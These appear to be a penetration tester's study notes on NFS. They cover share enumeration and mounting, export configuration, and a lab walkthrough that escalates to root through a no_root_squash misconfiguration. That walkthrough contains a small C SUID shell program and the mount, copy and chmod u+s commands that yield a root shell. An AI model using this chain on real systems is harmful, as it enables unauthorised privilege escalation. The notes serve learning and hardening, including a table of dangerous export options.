# Interacting w/ service 
```
# Show available NFS shares
showmount -e $IP

# Mount NFS shares
mount -t nfs $IP:share /tmp/mount/ -o nolock

# Unmount NFS shares
umount /tmp/mount
```


# Share a folder to a subnet :
```
root@nfs:~# echo '/mnt/nfs  10.129.14.0/24(sync,no_subtree_check)' >> /etc/exports
root@nfs:~# systemctl restart nfs-kernel-server 
root@nfs:~# exportfs

/mnt/nfs      	10.129.14.0/24
```


# Root Squash
When an NFS volume is created, various options can be set:

|Option|Description|
|---|---|
|`root_squash`|If the root user is used to access NFS shares, it will be changed to the `nfsnobody` user, which is an unprivileged account. Any files created and uploaded by the root user will be owned by the `nfsnobody` user, which prevents an attacker from uploading binaries with the SUID bit set.|
|`no_root_squash`|Remote users connecting to the share as the local root user will be able to create files on the NFS server as the root user. This would allow for the creation of malicious scripts/programs with the SUID bit set.|
By default, ``Root Squashing`` is enabled, and ``prevents`` anyone connecting to the NFS share from having root access to the NFS volume.
But if ``no_root_squash`` is set, we could create a SETUID binary that executes `/bin/sh` using our local root user. We can then mount the `/tmp` directory locally, copy the root-owned binary over to the NFS server, and set the SUID bit.
```
NFS Access ->
Gain Low Privilege Shell ->
Upload Bash Executable to the NFS share ->
Set SUID Permissions Through NFS Due To Misconfigured Root Squash ->
Login through SSH ->
Execute SUID Bit Bash Executable ->
ROOT ACCESS
```
- We could create a reverse shell binary on ``TARGET MACHINE`` & generate it :
```bash
htb@NIX02:/tmp$ cat /tmp/shell.c 

#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
#include <stdlib.h>

int main(void)
{
  setuid(0); setgid(0); system("/bin/bash");
}

========================================================================================
# Generate binary
htb@NIX02:/tmp$ gcc shell.c -o shell
```
- Next we need to mount the share locally on our ``ROOT EXEGOL`` & set the permissions
```bash
root@exegol:/workspace$ mount -t nfs 10.129.2.12:/tmp /mnt
root@exegol:/workspace$ cp shell /mnt
root@exegol:/workspace$ chmod u+s /mnt/shell
```
- Going back to the host's low privileged session, we can get a privileged root shell 
```bash 
ls -la
-rwsr-xr-x  1 root  root  16712 Sep  1 06:15 shell

htb@NIX02:/tmp$ ./shell
root@NIX02:/tmp$
```

# Dangerous Settings

```
# Conf file
/etc/exports

The default `exports` file also contains some examples of configuring NFS shares. 
First, the folder is specified and made available to others, and then the rights they will have on this NFS share are connected to a host or a subnet.
Finally, additional options can be added to the hosts or subnets.
```

| **Option**             | **Description**                                                                                                                             |
| ---------------------- | ------------------------------------------------------------------------------------------------------------------------------------------- |
| `rw`                   | Read and write permissions.                                                                                                                 |
| `ro`                   | Read only permissions.                                                                                                                      |
| `sync`                 | Synchronous data transfer. (A bit slower)                                                                                                   |
| `async`                | Asynchronous data transfer. (A bit faster)                                                                                                  |
| `secure`               | Ports above 1024 will not be used.                                                                                                          |
| `insecure`             | Ports above 1024 will be used.                                                                                                              |
| `no_subtree_check`     | This option disables the checking of subdirectory trees.                                                                                    |
| `root_squash`          | Assigns all permissions to files of root UID/GID 0 to the UID/GID of anonymous, which prevents `root` from accessing files on an NFS mount. |
| **Dangerous settings** | **Description**                                                                                                                             |
| `rw`                   | Read and write permissions.                                                                                                                 |
| `insecure`             | Ports above 1024 will be used. Prevents the fact that no users can use sockets above port 1024 for the NFS service and interact with it.    |
| `nohide`               | If another file system was mounted below an exported directory, this directory is exported by its own exports entry.                        |
| `no_root_squash`       | All files created by root are kept with the UID/GID 0.                                                                                      |
